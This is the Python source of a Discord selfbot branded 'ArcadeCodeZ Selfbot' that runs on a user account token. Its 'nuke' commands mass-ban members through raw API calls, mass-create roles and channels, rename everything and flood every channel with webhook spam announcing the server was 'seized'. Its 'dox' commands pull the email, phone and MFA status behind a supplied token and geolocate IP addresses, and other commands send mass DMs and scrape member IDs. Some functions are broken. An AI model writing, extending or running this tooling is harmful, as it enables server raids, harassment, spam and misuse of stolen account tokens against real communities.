
import os
os.system('pip install discord')
os.system('pip install colorama')
import discord
from discord.ext import commands
import asyncio 
import logging
import random 
from colorama import Fore
import requests
import json
import datetime
import random
import threading
import random
import time
import threading
from webserver import keep_alive


token = input("\033[0;96m[~\033[0;96m] \033[0;96mTOKEN - ")
prefix = input("\033[0;96m[~\033[0;96m] \033[0;96mSET PREFIX - ")
client = commands.Bot(command_prefix=prefix, case_insensitive=True,
                      self_bot=True)
client.remove_command('help')
header = {"Authorization": f'Bot {token}'}
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')
stream_url = "https://www.twitch.tv/chirag"
#yt links doesnt work
intents = discord.Intents.all()
intents.members = True

@client.event
async def on_ready():
  print("\033[0;96m  \n\033[0;96m   \n\033[0;96m \n\033[0;96m\n\033[0;96m   \n\033[0;96m \n\033[0;96m    \n\033[0;96m        \n\033[0;96m           \n\033[0;96m                 \n\n\n\033[0;96mGOD SB READY TO DESTROY!\n\033[0;96mFOR MORE USE >HELP")

@client.command(pass_context=True)
async def help(ctx):
    embed = discord.Embed(color= 0x2f3136,description=f"[Join Ts](https://discord.gg/tsop)")
    embed.set_author(name="ArcadeCodeZ Selfbot", icon_url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.add_field(name="*Categories*", value="""**```
• Help                 | Shows this command
• Text                 | Shows Text commands
• Nuke                 | Shows Nuke commands
• Utility              | Shows Utility commands
• Dox                  | Shows Dox commands
• Activity             | Shows Activity commands
• Botinfo              | Shows info of the bot
```**""", inline=False)
    embed.add_field(name="*Usage*", value="`%shelp [category/command]`" % (ctx.prefix), inline=False)
    embed.set_footer(text="replit.com/@chirag0p")
    await ctx.reply(embed=embed)

@client.command(pass_context=True)
async def dox(ctx):
    embed = discord.Embed(color= 0x2f3136)
    embed.set_author(name="ArcadeCodeZ Selfbot", icon_url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.add_field(name="*Categories*", value="""**```
• tdox         | shows info of the token
• ipdox        | shows info of the ip
```**""", inline=False)
    embed.add_field(name="*Usage*", value="`%shelp [category/command]`" % (ctx.prefix), inline=False)
    embed.set_footer(text="For help type >help")
    await ctx.reply(embed=embed)

@client.command()
async def ipdox(ctx, *, ip: str = '1.3.3.7'):
  chiragip = requests.get(f'https://ipapi.co/{ip}/json/')
  chiragip = chiragip.json()
  em = discord.Embed(color=0x2f3136)
  fields = [
        {
            'name': 'IP',
            'value': chiragip["ip"]
        },
        {
            'name': 'Version',
            'value': chiragip["version"]
        },
        {
            'name': 'Country',
            'value': chiragip["country_name"]
        },
        {
            'name': 'City',
            'value': chiragip["city"]
        },
        {
            'name': 'Region',
            'value': chiragip["region"]
        },
        {
            'name': 'Org',
            'value': chiragip["org"]
        },
        {
            'name': 'Latitute',
            'value': chiragip["latitude"]
        },
        {
            'name': 'Longitude',
            'value': chiragip["longitude"]
        },
        {
            'name': 'Asn',
            'value': chiragip["asn"]
        },
        {
            'name': 'PostalCode',
            'value': chiragip["postal"]
        },
        {
            'name': 'TimeZone',
            'value': chiragip["timezone"]
        },
  ]
  for field in fields:
      if field['value']:
          em.add_field(name=field['name'], value=field['value'], inline=True)
          em.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
            
  return await ctx.reply(embed=em, mention_author=True)

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl",
    "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg",
    "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"
]

@client.command()
async def tdox(ctx, token):
    
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    try:
        chiragz = requests.get(
            'https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        chiragz = chiragz.json()
        user_id = chiragz['id']
        locale = chiragz['locale']
        avatar_id = chiragz['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + token,
            'Content-Type': 'application/json'
        }
        try:
            chiragz = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            chiragz = chiragz.json()
            user_id = chiragz['id']
            locale = chiragz['locale']
            avatar_id = chiragz['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(color=0x2f3136,
                description=
                f"Name: `{chiragz['username']}#{chiragz['discriminator']} ` **BOT**\nID: `{chiragz['id']}`\nEmail: `{chiragz['email']}`\nCreation Date: `{creation_date}`"
            )
            fields = [
                {
                    'name': 'Flags',
                    'value': chiragz['flags']
                },
                {
                    'name': 'Local language',
                    'value': chiragz['locale'] + f"{language}"
                },
                {
                    'name': 'Verified',
                    'value': chiragz['verified']
                },
            ]
            for field in fields:
                if field['value']:
                    em.add_field(
                        name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )
                    em.set_footer(text="Credits to ArcadeCodeZ :O")
            return await ctx.reply(embed=em, mention_author=True)
        except KeyError:
            await ctx.reply("ArcadeCodeZ Selfbot | Invalid Token Specified", mention_author=True)
    em = discord.Embed(color=0x2f3136,
        description=
        f"Name: `{chiragz['username']}#{chiragz['discriminator']}`\nID: `{chiragz['id']}`\nEmail: `{chiragz['email']}`\nCreation Date: `{creation_date}`"
    )
    em.set_footer(text="Credits to ArcadeCodeZ :o")
    nitro_type = "None"
    if "premium_type" in chiragz:
        if chiragz['premium_type'] == 2:
            nitro_type = "Nitro Booster"
        elif chiragz['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {
            'name': 'Phone',
            'value': chiragz['phone']
        },
        {
            'name': 'Flags',
            'value': chiragz['flags']
        },
        {
            'name': 'Local language',
            'value': chiragz['locale'] + f"{language}"
        },
        {
            'name': 'MFA',
            'value': chiragz['mfa_enabled']
        },
        {
            'name': 'Verified',
            'value': chiragz['verified']
        },
        {
            'name': 'Nitro',
            'value': nitro_type
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(
                name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )
            em.set_footer(text="Credits to ArcadeCodeZ :o")
    return await ctx.reply(embed=em, mention_author=True)

@client.command(pass_context=True)
async def utility(ctx):
    embed = discord.Embed(color= 0x2f3136)
    embed.set_author(name="ArcadeCodeZ Selfbot", icon_url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.add_field(name="*Categories*", value="""**```
• avatar        | shows avatar of user
• banner        | shows banner of user
• guildicon     | shows guild icon 
• dCM           | disables community mode
• eCM           | enables community mode
• servername    | changes servername
• serverinfo    | shows info of the server
• scrape        | scrapes channels roles and members
• copyserver    | clones the server
• leavegroups   | leaves all groups
• delwebhook    | deletes webhook
• embed         | embeds the message
• image         | embeds the image link
• delwebhook    | deletes webhook
• screenshot    | sends screenshot of site
• channelclean  | deletes channel with specific name
• massdm        | dms everyone in dm list
• ping          | shows bot latency
• membercount   | shows the membercount
```**""", inline=False)
    embed.add_field(name="*Usage*", value="`%shelp [category/command]`" % (ctx.prefix), inline=False)
    embed.set_footer(text="For help type >help")
    await ctx.reply(embed=embed)

@client.command(pass_context=True)
async def nuke(ctx):
    embed = discord.Embed(color= 0x2f3136)
    embed.set_author(name="ArcadeCodeZ Selfbot", icon_url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.add_field(name="*Categories*", value="""**```
• delemojis             | deletes guild emotes
• nickall               | nicknames everyone 
• renamechannels (rc)   | renames all channels
• renameroles (rr)      | renames all roles
• massrole (mr)         | spams create role
• masschannel           | spams create channel
• prune                 | kicks users inactive
• delstickers           | deletes guild stickers
• massban               | mass bans everyone
• channelfuckery        | mass community spam
• webhookspam           | spams through webhook
```**""", inline=False)
    embed.add_field(name="*Usage*", value="`%shelp [category/command]`" % (ctx.prefix), inline=False)
    embed.set_footer(text="For help type >help")
    await ctx.reply(embed=embed)

@client.command(pass_context=True)
async def text(ctx):
    embed = discord.Embed(color= 0x2f3136)
    embed.set_author(name="ArcadeCodeZ Selfbot", icon_url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.add_field(name="*Categories*", value="""**```
• Spam                    | Spams a text
• Purge                   | Purges a text
• MassDm                  | Massdm all open Dms
• FirstMsg                | Shows first message
```**""", inline=False)
    embed.add_field(name="*Usage*", value="`%shelp [category/command]`" % (ctx.prefix), inline=False)
    embed.set_footer(text="For help type >help", icon_url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    await ctx.reply(embed=embed)

@client.command(pass_context=True)
async def activity(ctx):
    embed = discord.Embed(color= 0x2f3136)
    embed.set_author(name="ArcadeCodeZ Selfbot", icon_url=f"{ctx.author.avatar_url}")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.add_field(name="*Categories*", value="""**```
• Stream                  | Sets a stream status
• Listening               | Sets a listening status
• Watching                | Sets a watching status
• Game                    | Sets a game status
```**""", inline=False)
    embed.add_field(name="*Usage*", value="`%shelp [category/command]`" % (ctx.prefix), inline=False)
    embed.set_footer(text="For help type >help")
    await ctx.reply(embed=embed)

@client.command(pass_context=True)
async def botinfo(ctx):
    embed = discord.Embed(color= 0x2f3136, description=f"[Join Ts](https://discord.gg/tsop)")
    embed.set_author(name="ArcadeCodeZ Selfbot", icon_url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
    embed.add_field(name="*Categories*", value="""**```
• Name                    | ArcadeCodeZ Selfbot V3
• Made By                 | ArcadeCodeZ
```**""", inline=False)
    embed.add_field(name="*Usage*", value="`%shelp [category/command]`" % (ctx.prefix), inline=False)
    embed.set_footer(text="For help use >help")
    await ctx.reply(embed=embed)

@client.command()
async def spam(ctx , amount:int , * , message):
    for i in range(amount):
        await ctx.send(message)

@client.command()
async def servername (ctx ,*, name):
    await ctx.guild.edit(name=name)

@client.command(aliases=["av"])
async def avatar(ctx, member:discord.Member):
    if member == None:
        member = ctx.author
    embed = discord.Embed(color=0x2f3136)
    embed.set_author(name=f"{member.name}'s Avatar")
    embed.set_image(url=f"{member.avatar_url}")
    await ctx.reply(embed = embed)

@client.command(pass_context=True)
async def banner(ctx, user:discord.Member):
    if user == None:
        user = ctx.author
    bid = await client.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
    banner_id = bid["banner"]
    
    if banner_id:
        embed = discord.Embed(title="ArcadeCodeZ Selfbot",color=0x2f3136)
        embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
        embed.set_image(url=f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024")
        embed.set_footer(text="Credits to ArcadeCodeZ :o")
        await ctx.reply(embed=embed)
    

@client.command()
async def delemojis(ctx):
    for emoji in list(ctx.list.emojis):
        try:
            await emoji.delete()
        except:
            await ctx.reply("Failed!  Most likely missing perms")

@client.command
async def nickall(ctx , * , name = "ArcadeCodeZ Was Here"):
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
        except:
            await ctx.reply("Failed! Most likely missing perms")

@client.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    for channel in ctx.guild.channels:
        await channel.edit(name=name)

    await ctx.reply("> **ArcadeCodeZ Selfbot  Renamed all channels succesfully**")

@client.command(aliases=["rr"])
async def renameroles(ctx, *, name):
    for role in ctx.guild.roles:
        await role.edit(name=name)
    await ctx.reply("> **ArcadeCodeZ Selfbot  Renamed all roles succesfully**")

@client.event
async def on_command_error(ctx, error):
    error = getattr(error, 'original', error)
    await ctx.reply(embed=discord.Embed(color=0x2f3136, title = "ArcadeCodeZ Selfbot ERROR" ,timestamp=ctx.message.created_at, description=f'```{error}```'))

@client.command(aliases=["mr"])
async def massrole(ctx, *, name):
    for _i in range(500):
        try:
            await ctx.guild.create_role(name="name", color=0x2f3136)
        except:
            return

@client.command()
async def masschannel(ctx, *, name):
    for _i in range(500):
        try:
            await ctx.guild.create_text_channel(name="name")
        except:
            return

@client.command()
async def serverinfo(ctx):
  embed = discord.Embed(title = "ArcadeCodeZ Selfbot  ServerInfo" , color = 0x2f3136)
 
  embed.set_thumbnail(url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
  embed.add_field(name = "**Server ID**" , value = f"```{ctx.guild.id}```" , inline = True)
  embed.add_field(name = "**Server Name**" , value = f"```{ctx.guild.name}```" , inline = True)
  embed.add_field(name = "**Server Owner**" , value = f"```{ctx.guild.owner}```" , inline = True)
  embed.set_footer(text="For help type >help" ,icon_url="https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
  await ctx.reply(embed = embed)

@client.command()
async def prune(ctx):
  await ctx.guild.prune_members(days=1, compute_prune_count=False, roles=ctx.guild.roles)
  await ctx.reply("> **ArcadeCodeZ Pruned Members**")

@client.command()
async def scrape(ctx):
  await ctx.message.delete()
  mem = ctx.guild.members
  chl = ctx.guild.channels
  rle = ctx.guild.roles
  for member in mem:
      try:
        mfil = open("members.txt","a")

        mfil.write(str(member.id) + "\n")
        mfil.close()
        await ctx.send("Succesfully Scraped!")

      except Exception as e:
        await ctx.send("Failed Scraping Members!")
  for channel in chl:
      try:
        cfil = open("channels.txt","a")
        cfil.write(str(channel.id) + "\n")
      except Exception as e:
        await ctx.send("Failed Scraping Channels!")
  for role in rle:
      try:
        rfil = open("roles.txt","a")
        rfil.write(str(role.id) + "\n")
      except Exception as e:
        await ctx.send("Failed Scraping Roles!")

@client.command(aliases=['guildpfp'])
async def guildicon(ctx):
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    embed.set_footer(text="For help type >help")
    await ctx.send(embed=em)

@client.command()
async def purge(ctx, amount: int):
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@client.command()
async def leavegroups(ctx):
    for channel in client.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@client.command()
async def stream(ctx, *, message): 
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await client.change_presence(activity=stream) 
    await ctx.reply('Streaming started')   

@client.command()
async def game(ctx, *, message):
    game = discord.Game(
        name=message
    )
    await client.change_presence(activity=game)
    await ctx.reply('Playing started')

@client.command()
async def listening(ctx, *, message):
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))
    await ctx.reply('Listening started')

@client.command()
async def watching(ctx, *, message):
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))
    await ctx.reply('Watching started')

@client.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(color=0x2f3136,description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    embed.set_footer(text="For help type >help")
    await ctx.send(embed=embed)

@client.command()
async def embed(ctx , content):
  embed = discord.Embed(title = "ArcadeCodeZ Selfbot " ,description = content , color = 0x2f3136)
  embed.set_thumbnail(url = "https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
  await ctx.reply(embed=embed)

@client.command()
async def delstickers(ctx):
    for emoji in list(ctx.list.stickers):
        try:
            await emoji.stickers()
        except:
            await ctx.reply("Failed!  Most likely missing perms")

title = '''*```ArcadeCodeZ Selfbot ```*'''
link_to_show = "https://cheemz.host.xyz/"
footer = "ArcadeCodeZ OP"

@client.command()
async def image(ctx, link):
  await ctx.message.delete()
  embd = discord.Embed(
    title =title,
    description = '',
    colour = discord.Colour.blue())
  embd.set_footer(text=footer)
  embd.set_image(url=link)
  await ctx.channel.send(link_to_show , embed=embd)

@client.command()
async def delwebhook(ctx,link=None):
    if link == None:
      await ctx.send(" ArcadeCodeZ Selfbot | PLEASE SPECIFY A WEBHOOK")

    else:
        await ctx.send(" ArcadeCodeZ Selfbot | DELETEING WEBHOOK")

        result = requests.delete(link)
  
        if result.status_code == 204:
            await ctx.send(" ArcadeCodeZ Selfbot | DELETED WEBHOOK")
        else:
            await ctx.send("Failed!")


def spam(webhook):
    while webhookspam:
        randomcol = random.randint(0, 1675354)
        content = {'content':'https://discord.gg/tsop /seized by arcadecodez @everyone'}
        spamming = requests.post(webhook, json=content)
        idkerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in idkerror.lower():
            try:
                ellol = json.loads(idkerror)
                ratelimit = ellol['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 8)
                time.sleep(delay)

        else:
            delay = random.randint(30, 55)
            time.sleep(delay)


@client.command()
async def webhookspam(ctx):
    spammingwebhook = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=spam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed By ArcadeCodeZ')
                threading.Thread(target=spam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.GREEN} MADE WEBHOOK")


@client.command(aliases=['stopwebhookfuck', 'webhookstop', 'webhookspamstop', 'stopwebhooksspam', 'webhookspamoff'])
async def stopwebhookspam(ctx):
    global spammingwebhook
    try:
        print("Stopping webhook spam")
    except:
        pass

    spammingwebhook = False

@client.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.reply("Logging out of ArcadeCodeZ Selfbot")
    await ctx.reply("Logged out succesfully")
    await client.logout()

@client.command(aliases=["screenshot"])
async def ss(ctx, *, k):
  embed = discord.Embed(title="ArcadeCodeZ Selfbot ", color=0x2f3136)
  embed.set_image(url=f"https://image.thum.io/get/{k}")
  await ctx.reply(embed=embed)

@client.command(aliases=["cc"])
async def channelclean(ctx, channeltodelete):
    for channel in ctx.message.guild.channels:
            if channel.name == channeltodelete:
                try:
                    await channel.delete()
                    embed = discord.Embed(title=" ArcadeCodeZ Selfbot", description = f"**Succesfully Deleted Channels Named {channel.name}**" ,color = 0x2f3136)
                    embed.set_footer(text="Credits to this code - ArcadeCodeZ:o")
                    await ctx.reply(embed=embed)
                except:
                   pass

headers={"Authorization": f'{token}'}

@client.command()
async def massban(ctx , guild):
  guild = guild
  await client.wait_until_ready()
  guildOBJ = client.get_guild(int(guild))
  members = await guildOBJ.chunk()

  try:
    os.remove("members.txt")
  except:
    pass

    membercount = 0
    with open('members.txt', 'a') as m:
      for member in members:
        m.write(str(member.id) + "\n")
        membercount += 1
      print(f" Scraped {membercount} Members")
      m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
      while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Banned{member.strip()}")
                    break
                else:
                    break

    members.close()

@client.command()
async def massdm(ctx, *, idk):
	await ctx.reply("**ArcadeCodeZ Selfbot **\n> MASS DM STARTED", mention_author=True)
	for channel in client.private_channels:
		try:
			await channel.send(idk)
		except:
			continue 

@client.command()
async def channelfuckery(ctx):
      for i in range(200):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})
        y = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json={"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"})

@client.command(name='disableCommunityMode', aliases=['dCM', 'dCommunityMode'])
async def disableCommunityMode(ctx):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})
@client.command(aliases=["eCM"])
async def enableCommunityMode(ctx):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json={"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"})

@client.command()
async def copyserver(ctx): 
    wow = await client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(chann.name, overwrites=chann.overwrites, topic=chann.topic, slowmode_delay=chann.slowmode_delay, nsfw=chann.nsfw, position=chann.position)
            print(ctx.guild.roles)
    for role in ctx.guild.roles[::-1]:
        if role.name != "@everyone":
            try:
                await wow.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
                print(f"Created new role : {role.name}")
            except:
                break

@client.command(aliases=["mc"])
async def membercount(ctx):
    embed = discord.Embed(title='ArcadeCodeZ Selfbot', color=0x2f3136 )
    embed.add_field(name="Server Members :", value=f"`{len(ctx.guild.members)}`")
    embed.set_thumbnail(url='https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024')
    embed.set_footer(text="Created By ArcadeCodeZ", icon_url='https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024')
    await ctx.reply(embed=embed)

@client.command()
async def ping(ctx):
  embed = discord.Embed(title="ArcadeCodeZ Selfbot", description=f"- **Latency is `{int(client.latency * 1000)}` ms**", colour=0x2f3136) 
  embed.set_thumbnail(url='https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024')
  embed.set_footer(text="For help type >help" ,  icon_url= "https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
  await ctx.reply(embed=embed)

@client.command()
async def enlarge(ctx , emoji: discord.PartialEmoji = None):
  embed = discord.Embed(title = f"Emoji Name | {emoji.name}" , color = 0x2f3136)
  embed.set_image(url=  f'{emoji.url}')
  embed.set_author(name=f"Requested by{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
  embed.set_footer(text="ArcadeCodeZ Selfbot" ,  icon_url= "https://cdn.discordapp.com/icons/915249556613136464/a_36562ad95830b6aedbeb78d699b89ad6.gif?size=1024")
  await ctx.reply(embed = embed)

keep_alive()
client.run(token, bot=False)